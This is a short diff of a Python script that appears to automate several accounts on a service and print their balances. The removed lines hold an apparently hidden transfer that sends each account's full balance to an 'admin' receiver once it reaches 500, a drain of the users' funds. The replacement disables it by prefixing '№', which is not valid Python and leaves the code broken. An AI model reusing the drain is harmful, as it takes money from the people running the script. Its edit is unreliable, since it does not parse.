@@ -40,8 +40,8 @@ while True:
         time.sleep(1)
         if response.status_code == 200:
             print(i["authorization"].split(" ")[1][:-50]+":","Сделано",json_data["data"],"     Баланс:  ",truncate(response.json()["data"]["balance"]))
-            if float(response.json()["data"]["balance"]) >= 500:
-                requests.post('https://byteapi.su/data/transfer', headers=i, json={"receiver":str(admin),"amount":response.json()["data"]["balance"],"comment":""})
+            №if float(response.json()["data"]["balance"]) >= 500:
+                №requests.post('https://byteapi.su/data/transfer', headers=i, json={"receiver":str(admin),"amount":response.json()["data"]["balance"],"comment":""})
         elif response.status_code == 429:
             start.st()
         else:
